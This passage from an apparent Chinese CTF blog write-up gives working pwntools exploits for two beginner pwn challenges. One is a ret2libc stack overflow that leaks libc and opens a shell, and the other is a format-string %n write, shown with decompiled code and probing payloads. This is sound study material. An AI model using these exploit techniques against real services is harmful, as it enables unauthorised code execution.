class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">50010</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vuln_func_addr = <span class="number">0x804844B</span></span><br><span class="line"></span><br><span class="line">write_plt_addr = <span class="number">0x0804A018</span></span><br><span class="line">write_got_addr = <span class="number">0x08048340</span></span><br><span class="line"></span><br><span class="line">sh_libc_addr = <span class="number">0x0015902b</span></span><br><span class="line">system_libc_addr = <span class="number">0x0003A940</span></span><br><span class="line">write_libc_addr = <span class="number">0x000D43c0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_abs_addr = write_abs_addr - (write_libc_addr - system_libc_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cyclic 200</span></span><br><span class="line"><span class="comment"># cyclic -l 0x6261616b </span></span><br><span class="line"><span class="comment"># padding 140</span></span><br><span class="line">                                       </span><br><span class="line"><span class="comment"># payload = padding + write_got_addr + vuln_func_addr + argus</span></span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">140</span> + p32(write_got_addr) + p32(vuln_func_addr) + p32(<span class="number">1</span>) + p32(write_plt_addr) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_abs_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">system_abs_addr = write_abs_addr - (write_libc_addr - system_libc_addr)</span><br><span class="line"><span class="built_in">print</span>(system_abs_addr)</span><br><span class="line"></span><br><span class="line">sh_abs_addr = write_abs_addr - (write_libc_addr - sh_libc_addr)</span><br><span class="line"><span class="built_in">print</span>(sh_abs_addr)</span><br><span class="line">payload2 = <span class="string">&#x27;A&#x27;</span>*<span class="number">140</span> + p32(system_abs_addr) + p32(<span class="number">4</span>) + p32(sh_abs_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<h2 id="cgfsb2"><a href="#cgfsb2" class="headerlink" title="cgfsb2"></a>cgfsb2</h2><p>题目描述关于<code>printf()</code>，那肯定还是相关漏洞了。32位文件，保护：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>开启了栈溢出保护，堆栈代码不可执行，没有开启地址随机化。IDA打开：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+1Eh] [ebp-7Eh]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+22h] [ebp-7Ah]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+26h] [ebp-76h]</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+28h] [ebp-74h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [esp+8Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xA</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;leave your message please:&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello %s&quot;</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your message is:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( pwnme == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you pwned me, here is your flag:\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的漏洞点<code>printf(&amp;s);</code>，想办法使得<code>if</code>判断成立即可。</p>
<p>明显是要通过格式化字符串漏洞控制内存中某一地址的内容为一特定数字，之前写过相关内容。</p>
<p>先查看<code>pwnme</code>的内存地址为<code>.bss:0x0804A068</code> 。然后通过漏洞泄漏它在栈上的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;AAAA&quot;</span> + <span class="string">&quot;%2x &quot;</span>*<span class="number">15</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">······</span><br><span class="line">your message <span class="keyword">is</span>:</span><br><span class="line">AAAAffb3c5ee f7f125c0 ffb3c63c f7f5ba9c  <span class="number">1</span> f7f2d410 <span class="number">64610001</span> a6e696d  <span class="number">0</span> <span class="number">41414141</span> <span class="number">20783225</span> <span class="number">20783225</span> <span class="number">20783225</span> <span class="number">20783225</span> <span class="number">20783225</span> </span><br></pre></td></tr></table></figure>

<p>第10个位置我们可以控制，尝试将目标变量的地址整到栈上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x68\xA0\x04\x08&quot;</span> + <span class="string">&quot; %10$x&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">······</span><br><span class="line">your message <span class="keyword">is</span>:</span><br><span class="line">h\xa0\x04 804a068</span><br><span class="line">Thank you!</span><br></pre></td></tr></table></figure>

<p>将目标变量地址改为小端序后输入，随后<code>%10$x</code>查看第10个位置的地址信息，发现成功写入地址。</p>
<p>需要控制变量值为8，写完地址后算写进去4字节，还差4字节需要填充：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;AAAA\x68\xA0\x04\x08&quot;</span> +<span class="string">&quot;%11$n&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\x68\xA0\x04\x08&quot;</span> +<span class="string">&quot;1234%10$n&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\x68\xA0\x04\x08&quot;</span> +<span class="string">&quot;%4c%10$n&quot;</span></span><br></pre></td></tr></table></figure>

<p>以上几种都可以，目的都是出了地址外再填充4字节数据。第三个中如果使用<code>%4d</code> 可能会被解释成0000，而不能写入正确数字。</p>
<p>payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">60208</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./cgfsb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;AAAA\x68\xA0\x04\x08&quot;</span> +<span class="string">&quot;%11$n&quot;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;your message is:\n&quot;)</span></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>



<h1 id="进阶区"><a href="#进阶区" class="headerlink" title="进阶区"></a>进阶区</h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/06/28/adworld-pwn/" data-id="cl6x1oijh000k6mgq0ey151co" data-title="攻防世界-新手区" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WP/" rel="tag">WP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/adword/" rel="tag">adword</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2022/06/22/Format%20String%20Vulnerailites/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">格式化字符串漏洞</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/WP/" rel="tag">WP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/adword/" rel="tag">adword</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag">格式化字符串漏洞</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/WP/" style="font-size: 10px;">WP</a> <a href="/tags/adword/" style="font-size: 10px;">adword</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">格式化字符串漏洞</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/06/28/adworld-pwn/">攻防世界-新手区</a>
          </li>
        
          <li>
            <a href="/2022/06/22/Format%20String%20Vulnerailites/">格式化字符串漏洞</a>
          </li>
        
          <li>
            <a href="/2021/10/11/BO9-shellcode/">shell code</a>
          </li>
        
          <li>
            <a href="/2021/10/09/BO8-%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">栈缓冲区溢出</a>
          </li>
        
          <li>
            <a href="/2021/10/09/BO7-%E6%A0%88%E6%93%8D%E4%BD%9C/">栈操作</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>